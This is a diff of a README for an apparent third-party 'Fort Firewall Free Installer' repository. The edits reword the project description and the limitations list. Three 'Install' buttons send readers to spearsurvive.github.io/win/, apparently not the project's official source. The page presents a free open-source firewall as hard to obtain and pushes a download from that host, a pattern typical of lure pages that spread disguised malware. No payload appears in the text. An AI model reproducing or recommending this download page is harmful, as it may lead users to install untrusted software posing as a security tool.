@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Firewall-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Fort Firewall Free Installer** — Fort Firewall is a free, open-source application firewall for Windows built on Windows Filtering Platform (WFP). Works without internet access, no account required. Full offline installation.
+**💻 Fort Firewall Free Installer** — Fort Firewall is a free, open-source Windows firewall application based on Windows Filtering Platform. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Fort Firewall](https://img.shields.io/badge/⬇_Install_Fort%20Firewall-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fort Firewall](https://img.shields.io/badge/⬇_Install_Fort+Firewall-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Fort Firewall
 
-Fort Firewall is a free, open-source application firewall for Windows built on Windows Filtering Platform (WFP). It provides per-application network control, traffic monitoring, and a clean interface for managing which apps can access the internet.
+Fort Firewall is a free, open-source Windows firewall application based on Windows Filtering Platform. Block internet access per application, monitor network activity with traffic statistics, and create whitelist and blacklist rules for granular control. Fort Firewall's simple interface and effective application-level blocking make it an accessible firewall solution for privacy-conscious Windows users.
 
 ---
 
 ## ❌ Problem: Fort Firewall is hard to access
 
-- **Windows Only** — Not available on macOS or Linux
-- **Early Development** — Feature set still maturing compared to commercial alternatives
-- **Technical Interface** — Network rules and WFP concepts require some IT knowledge
-- **Limited Support** — Community-supported project without commercial support options
+- **Windows Only** — Windows-specific firewall built on WFP
+- **Driver Installation** — Requires kernel driver for network filtering
+- **Advanced Rules** — Advanced network rules less flexible than commercial enterprise firewalls
+- **Development Community** — Smaller community than established commercial firewall products
 
 ---
 
@@ -81,7 +81,7 @@ Fort Firewall is a free, open-source application firewall for Windows built on W
 
 <div align="center">
 
-[![⬇ Install Fort Firewall](https://img.shields.io/badge/⬇_Install_Fort%20Firewall-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fort Firewall](https://img.shields.io/badge/⬇_Install_Fort+Firewall-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Fort Firewall is a free, open-source application firewall for Windows built on W
 
 ---
 
-**Fort Firewall Free Installer** — Fort Firewall is a free, open-source application firewall for Windows built on Windows Filtering Platform (WFP). Install without internet connection today!
+**Fort Firewall Free Installer** — Fort Firewall is a free, open-source Windows firewall application based on Windows Filtering Platform. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Fort Firewall](https://img.shields.io/badge/⬇_Install_Fort%20Firewall-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fort Firewall](https://img.shields.io/badge/⬇_Install_Fort+Firewall-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
